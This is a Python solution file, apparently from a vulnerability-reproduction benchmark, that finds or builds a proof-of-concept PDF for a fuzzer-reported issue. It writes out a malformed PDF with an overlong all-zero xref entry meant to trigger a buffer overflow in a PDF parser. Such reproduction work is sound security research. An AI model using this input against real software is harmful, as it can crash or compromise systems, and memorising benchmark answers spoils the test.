import os
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = src_path
        tempdir = None

        # If src_path is a tarball, extract it to a temporary directory
        if os.path.isfile(src_path):
            lower = src_path.lower()
            if lower.endswith((".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tar.xz")):
                try:
                    tempdir = tempfile.mkdtemp(prefix="src-")
                    with tarfile.open(src_path, "r:*") as tf:
                        tf.extractall(tempdir)
                    root = tempdir
                except Exception:
                    # If extraction fails, fall back to synthetic PoC
                    return self.generate_synthetic_poc()

        try:
            poc = self.find_embedded_poc(root)
            if poc is not None:
                return poc
            return self.generate_synthetic_poc()
        finally:
            if tempdir is not None:
                try:
                    shutil.rmtree(tempdir)
                except Exception:
                    pass

    def find_embedded_poc(self, root: str) -> bytes | None:
        if not os.path.isdir(root):
            return None

        issue_id = "42536536"

        # Stage 1: Any file whose path contains the exact issue id
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                if issue_id in path:
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                        if data:
                            return data
                    except Exception:
                        continue

        # Stage 2: Look for small, fuzz-related PDF-like files with long zero runs
        keywords = ("fuzz", "oss-fuzz", "ossfuzz", "clusterfuzz", "poc", "testcase", "crash")
        candidates: list[tuple[int, str]] = []

        for dirpath, _, filenames in os.walk(root):
            dlower = dirpath.lower()
            if not any(k in dlower for k in keywords):
                continue

            for fn in filenames:
                low = fn.lower()
                ext = os.path.splitext(low)[1]
                if ext not in (".pdf", ".bin", ".raw", ".dat", ""):
                    continue

                path = os.path.join(dirpath, fn)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue

                if size > 1_000_000:
                    continue

                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue

                head = data[:64].lower()
                if (b"%pdf" in head or b"%pdf-" in head or b"%pdf" in data[:1024].lower()) and b"xref" in data.lower():
                    if b"0000000000000000" in data:
                        candidates.append((size, path))

        if candidates:
            candidates.sort()
            for _, path in candidates:
                try:
                    with open(path, "rb") as f:
                        return f.read()
                except Exception:
                    continue

        return None

    def generate_synthetic_poc(self) -> bytes:
        # Construct a minimal PDF with an overlong xref entry (f1) of all zeros
        header = b"%PDF-1.3\n"
        parts = [header]

        # xref table starts immediately after header
        xref_offset = len(b"".join(parts))

        parts.append(b"xref\n")
        parts.append(b"0 1\n")

        # Overlong f1 consisting only of zeros to trigger the vulnerability
        f1_zeros = b"0" * 1000  # significantly larger than any reasonable buffer
        f2 = b"00000"
        xref_entry = f1_zeros + b" " + f2 + b" n \n"
        parts.append(xref_entry)

        parts.append(b"trailer\n")
        parts.append(b"<<>>\n")
        parts.append(b"startxref\n")
        parts.append(str(xref_offset).encode("ascii") + b"\n")
        parts.append(b"%%EOF\n")

        return b"".join(parts)